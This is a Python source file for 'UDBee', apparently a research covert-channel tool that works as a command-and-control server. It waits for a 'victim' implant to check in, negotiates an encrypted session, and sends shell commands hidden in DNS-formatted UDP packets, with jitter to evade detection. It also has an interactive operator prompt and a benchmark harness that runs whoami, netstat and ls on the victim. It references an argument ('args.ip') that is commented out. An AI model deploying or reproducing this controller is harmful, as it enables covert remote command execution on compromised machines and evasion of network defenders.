import socket, random, time, sys, threading, argparse, base64, html, zlib, csv, statistics
from decryption import decrypt_symmetric, handshake_initiate_parser
from encryption import encrypt_symmetric, handshake_respond
from build_dns_message import dns_message
from prompt_toolkit import prompt
from prompt_toolkit.patch_stdout import patch_stdout
from check_missing import check_missing_packets
from generate_key_pairs import generate_key_pairs
from log import log_error, log_info, log_success, log_warn
from prompt_toolkit.shortcuts import print_formatted_text
from prompt_toolkit.formatted_text import HTML
from Crypto.PublicKey import ECC
from dnslib import DNSRecord

COMMAND_READY = threading.Event()

# --- Global Statistics Variables ---
current_retransmissions = 0
current_missing_packets = 0
# -----------------------------------

parser = argparse.ArgumentParser(description="UDBee - UDP Covert Channel Tool")
# parser.add_argument("-ip", required=True, type=str, help="Target IP address, IPv4 only")
parser.add_argument("--received-chunks", type=int, default=255000, help="Received chunks size in KB unit, default is 10KB byte (make it low to avoid memory overflow)")
parser.add_argument("-delay", type=float, default=0, help="Delay between fragments, default is a float number between 0 and 3")
parser.add_argument("-buffer", type=float, default=10000, help="Fragments buffer, default is 10000 (to prevent memory overflow)")
parser.add_argument("-jitter", type=float, default=0, help="Random +/- jitter to apply on each fragment delay")
parser.add_argument('--generate-keys', action='store_true', required=False, default=False, help="Generates public and private ECDH keys, only use when you run the tool first time, or when you want to regenrate keys (You'll need to rebuild the executable )")
args = parser.parse_args()

my_ip = "0.0.0.0"
my_port = 27381
SERVER = (my_ip, my_port)

target_ip = args.ip
target_port = None 

chunk_size = 120
delay = args.delay 
received_chunk_size = args.received_chunks * 1024
buffer_size = args.buffer
max_data_allowed = buffer_size * received_chunk_size
jitter = args.jitter 

my_priv_key = None
CURRENT_SESSION_KEY = None 

transmitted_messages = 0
received_chunks = {} 
expected_chunks = None
total_data_received = 0
last_received_time = None 
resends_requests = 0
sent_chunks = {} 

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

def send_raw(payload_text):
    global transmitted_messages
    try:
        chunks = dns_message(payload_text, chunk_size)
        for chunk in chunks:
            sock.sendto(chunk, (target_ip, target_port))
            transmitted_messages += 1
            jitter_delay = delay + random.uniform(-jitter, jitter)
            jitter_delay = max(0, jitter_delay)
            time.sleep(jitter_delay)
    except Exception as e:
        log_error(str(e))
        COMMAND_READY.set()

def send_msg(message, is_cached: bool):
    global transmitted_messages, CURRENT_SESSION_KEY, sent_chunks
    try:
        if isinstance(message, bytes):
            plaintext_bytes = message
        else:
            plaintext_bytes = str(message).encode('utf-8')

        if CURRENT_SESSION_KEY:
            encryption_result = encrypt_symmetric(plaintext_bytes, CURRENT_SESSION_KEY)
            if encryption_result.get("success") != True:
                log_error("Failed to encrypt command, session key might be invalid.")
                return
            payload_text = encryption_result["message"]
        else:
            log_error("Cannot send message, no active session key. Waiting for victim check-in.")
            return

        chunks = dns_message(payload_text, chunk_size)

        sent_chunks = {}
        i = 0
        for chunk in chunks:
            if is_cached:
                sent_chunks[i] = chunk
            i += 1
            sock.sendto(chunk, (target_ip, target_port))
            transmitted_messages += 1
            jitter_delay = delay + random.uniform(-jitter, jitter)
            jitter_delay = max(0, jitter_delay)
            time.sleep(jitter_delay)
    except Exception as e:
        log_error(str(e))
        COMMAND_READY.set()


def timeout_checker():
    global received_chunks, expected_chunks, last_received_time, resends_requests, current_retransmissions, current_missing_packets
    
    COMMAND_READY.wait()
    
    while True:
        try:
            if last_received_time is not None:
                if resends_requests < 6: 
                    try:
                        current_session_id = None
                        current_buffer = None
                        if received_chunks:
                            current_session_id = next(iter(received_chunks))
                            current_buffer = received_chunks[current_session_id]["chunks"]
                            expected_chunks = received_chunks[current_session_id]["total"]
                        if expected_chunks and current_buffer and (len(current_buffer) > 0) and ((time.time() - last_received_time) > 1.5):
                            missing_packets = check_missing_packets(current_buffer, expected_chunks)
                            if missing_packets:
                                log_info(f"<ansiyellow>Received an incomplete response from the vicim, asking victim for {len(missing_packets)} missing packets</ansiyellow>")
                                
                                # [!!] Record Statistics
                                current_retransmissions += 1
                                current_missing_packets += len(missing_packets)
                                
                                indices_str = ",".join(str(i) for i in missing_packets)
                                msg = f"RESEND:{indices_str}"
                                send_msg(msg, False)
                                resends_requests += 1
                                time.sleep(1)
                                continue
                    except Exception as e:
                        log_error(f"Timeout checker error: {str(e)}")
                else:
                    log_error("<ansired>Received an incomplete response from the vicim, tried 3 times to request the missing packets but didn't receive them, IGNORING THE RESPONSE!</ansired>")
                    resends_requests = 0
                    last_received_time = None
                    received_chunks = {}
                    expected_chunks = None
                    # [!!] Important: Do not reset stats here if you want to record the failure stats
                    COMMAND_READY.set()
            time.sleep(0.5)
        except Exception:
            pass
        time.sleep(0.5)

def listener():
    global transmitted_messages, target_ip, target_port, sent_chunks, received_chunks, expected_chunks, total_data_received, last_received_time, resends_requests, CURRENT_SESSION_KEY, my_priv_key
    
    while True:
        try:
            sock.bind(SERVER)
            log_success(f"<ansigreen>Binded successfully on {SERVER}</ansigreen>")
            break
        except:
            continue
    
    while True:
        try:
            data, addr = sock.recvfrom(4096)
            packet_length = len(data)
            total_data_received += packet_length
            transmitted_messages += 1
            
            if packet_length < 20: continue
            if packet_length > received_chunk_size:
                log_info(f"<ansiyellow>Ignored a {packet_length/1024}KB long packet, there maybe a possible attack.</ansiyellow>")
                continue
            if total_data_received >= max_data_allowed:
                log_info(f"<ansiyellow>Data received is beyond max data allowed ({total_data_received/max_data_allowed}), there maybe a possible attack, stopping tool now.</ansiyellow>")
                return
            if len(received_chunks) >= buffer_size:
                log_info(f"<ansiyellow>The buffer is full ({buffer_size}), there maybe a possible attack, stopping tool now.</ansiyellow>")
                return
            
            dns_request = DNSRecord.parse(data)
            if dns_request.header.qr == 0:
                query_name = str(dns_request.q.qname).rstrip('.')
                parts = query_name.split('.')
                if len(parts) < 5: continue
                
                session_id = dns_request.header.id
                index = int(parts[0])
                total = int(parts[1])
                if len(parts) == 5:
                    part = parts[2]
                else:
                    part = parts[2] + parts[3]
                
                ip, port = addr
                target_port = int(port)
                target_ip = ip
                last_received_time = time.time()
                
                if session_id not in received_chunks:
                    received_chunks[session_id] = {"total": total, "chunks": {}}
                buffer = received_chunks[session_id]
                if index in buffer["chunks"]: continue
                buffer["chunks"][index] = part
                
                if len(buffer["chunks"]) == buffer["total"]:
                    full_msg_b64 = "".join(buffer["chunks"][i] for i in sorted(buffer["chunks"]))
                    # missing_padding = len(full_msg) % 8 # Not used with b32hexdecode usually unless strict
                    # if missing_padding != 0:
                    #     full_msg += '=' * (8 - missing_padding)
                    full_msg_bytes = base64.b32hexdecode(full_msg_b64.encode('utf8'))
                    
                    try:
                        parsed = handshake_initiate_parser(full_msg_bytes)
                        if parsed and parsed.get("success"):
                            victim_eph_pub_pem = parsed["victim_eph_pub_pem"]
                            resp = handshake_respond(victim_eph_pub_pem, my_priv_key)
                            if resp and resp.get("success"):
                                CURRENT_SESSION_KEY = resp["master_key"] 
                                send_raw(resp["message"])
                                log_success("<ansigreen>Handshake: responded to victim handshake and set session key.</ansigreen>")
                                COMMAND_READY.set()
                                received_chunks.pop(session_id, None)
                                expected_chunks = None
                                resends_requests = 0
                                continue
                    except Exception:
                        pass
                    
                    if not CURRENT_SESSION_KEY:
                        log_error("No session key, ignoring packet.")
                        received_chunks.pop(session_id, None)
                        continue
                    
                    decryption_result = decrypt_symmetric(full_msg_bytes, CURRENT_SESSION_KEY)
                    
                    if not (decryption_result and decryption_result.get("success")):
                        if decryption_result:
                            log_error(decryption_result.get("message"))
                        else:
                            log_error("Decryption failed for an unknown reason.")
                        received_chunks.pop(session_id, None)
                        continue

                    decrypted_bytes = decryption_result["message"]
                    
                    try:
                        decompressed_data = zlib.decompress(decrypted_bytes)
                        full_msg = decompressed_data.decode("utf-8", errors="replace")
                    except zlib.error:
                        full_msg = decrypted_bytes.decode("utf-8", errors="replace")
                    except Exception as e:
                        full_msg = str(decrypted_bytes)
                    
                    if full_msg == "ACK":
                        sent_chunks = {}
                        last_received_time = None
                    elif full_msg.startswith("RESEND:"):
                        try:
                            indices_str = full_msg.split(":", 1)[1]
                            missings = [int(i) for i in indices_str.split(',')]
                            log_info(f"<ansiyellow>Victim requested resend of {len(missings)} command chunks...</ansiyellow>")
                            for missing_index in missings:
                                chunk = sent_chunks.get(missing_index)
                                if chunk is not None:
                                    sock.sendto(chunk, (target_ip, target_port))
                        except Exception as e:
                            log_error(f"Error processing victim's RESEND request: {e}")
                    elif full_msg == "heartbeat":
                        pass
                    else:
                        # Only print output if NOT running automated tests to keep console clean? 
                        # Or keep it for visual confirmation. Let's keep it for now but maybe shortened.
                        # print_formatted_text(HTML(f"<ansigreen>{html.escape(full_msg)}</ansigreen>"))
                        pass
                    
                    COMMAND_READY.set()
                    
                    received_chunks.pop(session_id, None)
                    expected_chunks = None
                    resends_requests = 0
                    continue
        except Exception:
            pass

def run_test(command_name, command_str, iterations, csv_writer):
    global current_retransmissions, current_missing_packets
    
    log_info(f"\n--- Starting Performance Test: '{command_name}' ({iterations} iterations) ---")
    timings_ms = []
    failures = 0
    
    for i in range(iterations):
        COMMAND_READY.clear()
        
        # [!!] Reset Stats for this iteration
        current_retransmissions = 0
        current_missing_packets = 0
        
        start_time = time.perf_counter()
        
        send_msg(command_str, True)
        
        success = COMMAND_READY.wait(timeout=120.0)
        
        end_time = time.perf_counter()
        
        if not success:
            log_error(f"Iteration {i+1} FAILED (Timeout after 120s)")
            # Write stats even for failure (might show high packet loss)
            csv_writer.writerow([command_name, i+1, "N/A", "TIMEOUT", current_retransmissions, current_missing_packets])
            failures += 1
        else:
            duration_ms = (end_time - start_time) * 1000
            timings_ms.append(duration_ms)
            
            # Log brief info to console
            status_msg = f"Iteration {i+1}/{iterations} complete: {duration_ms:.2f} ms"
            if current_retransmissions > 0:
                status_msg += f" | Retries: {current_retransmissions} | Lost Pkts: {current_missing_packets}"
            log_info(status_msg)
            
            # Write full stats to CSV
            csv_writer.writerow([command_name, i+1, f"{duration_ms:.4f}", "SUCCESS", current_retransmissions, current_missing_packets])
        
        time.sleep(0.5)

    if timings_ms:
        avg = statistics.mean(timings_ms)
        stdev = statistics.stdev(timings_ms) if len(timings_ms) > 1 else 0
        min_val = min(timings_ms)
        max_val = max(timings_ms)
        log_success(f"--- Test '{command_name}' Complete ---")
        log_success(f"Success/Fail: {len(timings_ms)}/{failures}")
        log_success(f"Avg: {avg:.2f} ms | StdDev: {stdev:.2f} ms")
        log_success(f"Min: {min_val:.2f} ms | Max: {max_val:.2f} ms")
    else:
        log_error(f"--- Test '{command_name}' FAILED (All {iterations} iterations timed out) ---")
    
    print("\n")
    return timings_ms

def main_test_harness():
    log_info("--- [!!] STARTING AUTOMATED PERFORMANCE TEST HARNESS [!!] ---")
    
    csv_filename = f"performance_results_fs_stats_{time.strftime('%Y%m%d-%H%M%S')}.csv"
    log_info(f"Saving test results to: {csv_filename}")
    
    with open(csv_filename, 'w', newline='') as f:
        writer = csv.writer(f)
        # [!!] Updated Header
        writer.writerow(["TestName", "Iteration", "Duration_ms", "Status", "Retransmission_Count", "Total_Missing_Packets"])

        run_test(
            command_name="Light (whoami)",
            command_str="whoami",
            iterations=500,
            csv_writer=writer
        )
        
        run_test(
            command_name="Medium (netstat -antup)",
            command_str="netstat -antup",
            iterations=500,
            csv_writer=writer
        )
        
        run_test(
            command_name="Heavy (ls -lR /usr/bin)",
            command_str="ls -lR /usr/bin 2>/dev/null | head -n 2000",
            iterations=500,
            csv_writer=writer
        )

    log_success("--- [!!] ALL PERFORMANCE TESTS COMPLETE [!!] ---")
    log_info(f"Results saved to {csv_filename}")
    log_info("Test harness finished. Returning to interactive shell.")

def main():
    with patch_stdout():
        global my_priv_key, args, CURRENT_SESSION_KEY
        
        logo = f"""
<ansiyellow>
    UDBee - Stats Edition
</ansiyellow>"""
        print_formatted_text(HTML(logo))
        
        if args.generate_keys:
            generate_key_pairs()
            return
        
        try:
            with open('private_key.pem', 'r') as file:
                my_priv_key_pem = file.read()
                my_priv_key = ECC.import_key(my_priv_key_pem)
        except Exception as e:
            log_error(f"Exiting... Look like you have not initiated keys generation yet? error:\n{e}")
            return
        
        threads = []
        thread = threading.Thread(target=listener)
        thread2 = threading.Thread(target=timeout_checker)
        threads.append(thread)
        threads.append(thread2)
        for t in threads:
            t.start()
        
        log_error("<ansired>Waiting for victim check-in to establish secure session...</ansired>")
        COMMAND_READY.wait()
        log_success("<ansigreen>Session established! You can now send commands.</ansigreen>")
        
        # Run tests immediately
        main_test_harness()
        
        while True:
            if not COMMAND_READY.is_set():
                log_info("<ansiyellow>Waiting for response from victim...</ansiyellow>")
                COMMAND_READY.wait()
            
            command = prompt(HTML('\n<ansicyan>UDBee</ansicyan> <ansimagenta>> </ansimagenta>')).strip()
            COMMAND_READY.clear()
            
            if command.lower() in ["exit", "quit"]:
                print_formatted_text(HTML("<ansigreen>Stopped buzzing :)</ansigreen>"))
                sys.exit(1)
            elif command.lower() == "help":
                COMMAND_READY.set()
                continue
            else:
                if command.startswith("exec:"):
                    command = command.replace("exec:","")
                if command == "":
                    COMMAND_READY.set()
                    continue
                send_msg(command, True)

try:
    main()
except KeyboardInterrupt:
    log_info("<ansiyellow>Exiting on user interrupt (Ctrl+C)</ansiyellow>")
    exit()